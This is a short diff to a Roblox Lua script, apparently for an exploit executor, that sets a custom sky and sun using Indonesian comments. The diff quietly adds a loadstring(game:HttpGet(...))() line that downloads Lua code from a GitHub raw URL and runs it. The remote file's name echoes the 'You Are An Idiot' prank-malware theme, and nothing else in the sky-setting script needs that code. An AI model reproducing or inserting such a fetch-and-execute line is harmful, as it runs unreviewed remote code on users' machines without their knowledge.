@@ -117,7 +117,7 @@ function setSky(assetId,SunassetId)
     -- Masukkan ke Lighting
     newSky.Parent = Lighting
 end
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JokoFernandes/Relxzty/refs/heads/main/Workspace/El%20Konten/You-Are-And-IDIOT-Remix-Accompaniment-Instrumental-Accelerando%20OST%20.lua"))()
 -- Panggil fungsi dengan asset ID
 local sun = getcustomasset("sun.png")
 local sky = getcustomasset("sky.png")
